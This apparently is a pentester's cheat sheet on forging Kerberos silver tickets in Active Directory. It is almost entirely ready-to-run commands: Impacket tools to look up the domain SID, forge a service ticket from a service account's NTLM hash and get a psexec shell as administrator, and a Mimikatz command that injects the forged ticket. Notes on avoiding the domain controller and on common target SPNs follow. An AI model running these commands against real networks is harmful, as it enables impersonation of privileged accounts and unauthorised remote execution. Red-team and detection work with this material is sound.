# Silver Ticket

**Requires**: service account NTLM hash + domain SID + SPN

---

## Get Domain SID

```bash
impacket-lookupsid domain.local/user:REDACTED
```

```powershell
# From PowerShell
(Get-ADDomain).DomainSID
```

---

## Create Silver Ticket

```bash
impacket-ticketer -nthash SERVICE_NTLM_HASH -domain-sid S-1-5-21-... -domain domain.local -spn HTTP/target.domain.local administrator
export KRB5CCNAME=administrator.ccache
```

---

## Use the Ticket

```bash
impacket-psexec domain.local/administrator@target.domain.local -k -no-pass
```

---

## From Windows (Mimikatz)

```
mimikatz# kerberos::golden /sid:REDACTED-... /domain:REDACTED /target:REDACTED /service:REDACTED /rc4:REDACTED /user:REDACTED /ptt
```

---

## Notes

- Silver tickets are forged TGS tickets — they never touch the DC
- Only valid for the specific service (SPN) you target
- Common SPNs: `CIFS/host` (file shares), `HTTP/host` (web), `MSSQLSvc/host` (SQL)
